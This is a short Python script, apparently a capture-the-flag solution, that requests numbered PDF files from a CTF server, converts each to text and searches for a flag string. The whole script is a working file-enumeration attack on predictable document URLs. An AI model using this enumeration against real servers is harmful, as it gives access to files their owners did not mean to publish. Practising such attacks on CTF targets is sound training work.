#!/usr/bin/env python3
import os
import re
import requests as req
import codecs   # wegen unicode kack

# specify output directory
dir_out = './downloaded_files'

# create directory if non existend
if not os.path.exists(dir_out):
    os.mkdir(dir_out)

# define regex to match the flag
flag_regex = r'flag{.*}'

# specify number of requests
how_many = 300

# automating file-download
for i in range(how_many):
    # requests file
    res = req.get("http://hackfest.redrocket.club:31000/docs/document_{:03d}.pdf".format(i))

    # downlaod file if it exists
    if res.status_code == 200:
        # print current filename
        print('\r[+] Downloading document_{:03d}.pdf'.format(i))
        # write file to disk
        open('{}/document_{:03d}.pdf'.format(dir_out, i), 'wb').write(res.content)

        # convert pdf to txt
        os.system('pdftotext {}/document_{:03d}.pdf'.format(dir_out, i))

        # open txt to read content
        with codecs.open('{}/document_{:03d}.txt'.format(dir_out, i), 'r', encoding='utf-8', errors='ignore') as f:
            content = f.read()
            
            # check if file contains the flag
            if re.search(flag_regex, content):
                # print the flag
                print("\n[i] " + re.findall(flag_regex, content)[0])
                # remove temporary txt
                os.remove('{}/document_{:03d}.txt'.format(dir_out, i))
                # stop execution on success
                exit()
            else:
                # remove unnecessary files
                os.remove('{}/document_{:03d}.pdf'.format(dir_out, i))
                os.remove('{}/document_{:03d}.txt'.format(dir_out, i))

print("[!] Error 404 - flag not found")

